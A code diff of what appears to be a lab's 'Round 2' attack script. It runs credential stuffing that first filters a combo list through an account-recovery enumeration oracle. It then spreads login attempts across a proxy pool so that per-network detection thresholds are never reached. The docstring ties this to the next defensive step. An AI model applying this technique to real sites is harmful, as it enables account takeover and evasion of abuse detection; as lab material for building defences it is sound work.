@@ -1,85 +1,50 @@
-"""Round 2 attack — clean-list stuffer that spreads across cohorts.
+"""
+Round 2 attack: the clean-list stuffer that spreads across networks.
 
 Two moves beat per-cohort ratios:
 
-  1. Prune the combo list through the /forgot-password enumeration oracle, keeping
-     only emails that actually exist. The unknown-account ratio collapses to zero.
-  2. Give every surviving attempt its own /24 (drawn from a wide pool), so no
-     cohort ever reaches the detector's minimum sample size.
+  1. Prune the combo list through the account-recovery oracle (POST /api/account/recover answers
+     404 for an address with no account), keeping only emails that exist. The unknown-account ratio
+     collapses to zero.
+  2. Give every surviving attempt its own network: a rented residential-proxy fleet
+     (world.json's `residential_proxy_net` group: 384 addresses, one per /64). No cohort ever reaches
+     the detector's minimum sample, so there is no cohort to latch.
 
-What is left for the defender is only the *aggregate*: total attempts and
-new-account logins are clearly elevated, but there is no cohort precise enough to
-challenge without challenging everyone. That dead end is what motivates L3 — stop
-handing out the oracle, and screen the breached passwords the list is made of.
+What is left for the defender is the aggregate (a few hundred attempts spread over hundreds of
+networks), with no cohort precise enough to punish without punishing everyone. That dead end is
+Round 3: stop handing out the oracle, and screen the breached passwords the list is made of.
+
+    python attacks/round2_clean_list_stuffer.py
 """
 
-from __future__ import annotations
-
-import asyncio
-import ipaddress
 import itertools
 
-import httpx
+from _common import LabClient, combo_list, is_success, login, map_threads, report, world_pool
 
-from _common import BASE_URL, edge_headers, is_success, load_combos, require_local_target
-
-# A wide pool spanning 256 distinct /24s (benchmark range 198.18.0.0/16) — one
-# cohort per handful of attempts, so none reaches the detector's sample floor.
-WIDE_POOL = itertools.cycle(f"198.18.{octet}.10" for octet in range(256))
-CONCURRENCY = 20
-ACTOR = "bot:round2"
+ACTOR = "bot:cleanlist"
+HEADERS = [("User-Agent", "python-requests/2.34.2"), ("Accept", "application/json")]
 
 
-async def prune(client: httpx.AsyncClient, combos) -> list[tuple[str, str]]:
-    """Drop pairs whose email the /forgot-password oracle says does not exist."""
-    kept: list[tuple[str, str]] = []
-    sem = asyncio.Semaphore(CONCURRENCY)
+def run():
+    fleet = itertools.cycle(world_pool("residential_proxy_net"))     # next() is atomic enough for a lab
+    pairs, kept, hits = combo_list(), [], []
 
-    async def probe(email, pw):
-        async with sem:
-            try:
-                r = await client.post("/forgot-password", json={"email": email},
-                                      headers=edge_headers(ACTOR, next(WIDE_POOL)))
-                # Below L3 the oracle leaks: 200 = real account, 404 = unknown.
-                if r.status_code == 200:
-                    kept.append((email, pw))
-            except httpx.RequestError:
-                pass
+    def probe(pair):
+        r = LabClient(ACTOR, ip=next(fleet)).post("/api/account/recover", json={"email": pair[0]}, headers=HEADERS)
+        if r.status_code == 200:                                    # below Round 3: 200 = an account, 404 = none
+            kept.append(pair)
 
-    await asyncio.gather(*(probe(e, p) for e, p in combos))
-    return kept
+    def attempt(pair):
+        if is_success(login(LabClient(ACTOR, ip=next(fleet)), *pair)):
+            hits.append(pair[0])
 
-
-async def run() -> dict:
-    require_local_target(BASE_URL)
-    combos = load_combos()
-    hits: list[str] = []
-    sem = asyncio.Semaphore(CONCURRENCY)
-
-    async with httpx.AsyncClient(base_url=BASE_URL, timeout=10.0) as client:
-        cleaned = await prune(client, combos)
-
-        async def attempt(email, pw):
-            async with sem:
-                try:
-                    r = await client.post("/login", json={"email": email, "password": pw},
-                                          headers=edge_headers(ACTOR, next(WIDE_POOL)))
-                    if is_success(r):
-                        hits.append(email)
-                except httpx.RequestError:
-                    pass
-
-        await asyncio.gather(*(attempt(e, p) for e, p in cleaned))
-
-    return {"attack": ACTOR, "attempts": len(combos), "pruned_to": len(cleaned),
-            "accounts_taken_over": len(hits), "hits": sorted(hits)}
-
-
-def main():
-    result = asyncio.run(run())
-    print(f"[{result['attack']}] pruned {result['attempts']} -> {result['pruned_to']} existing, "
-          f"{result['accounts_taken_over']} accounts taken over")
+    map_threads(probe, pairs)
+    map_threads(attempt, list(kept))
+    return {"attacker": ACTOR, "attempted": len(pairs), "pruned_to": len(kept), "succeeded": len(hits),
+            "accounts_taken_over": len(hits)}
 
 
 if __name__ == "__main__":
-    main()
+    out = run()
+    print(f"[{ACTOR}] pruned {out['attempted']} -> {out['pruned_to']} existing, {out['accounts_taken_over']} accounts taken over")
+    report(**out)
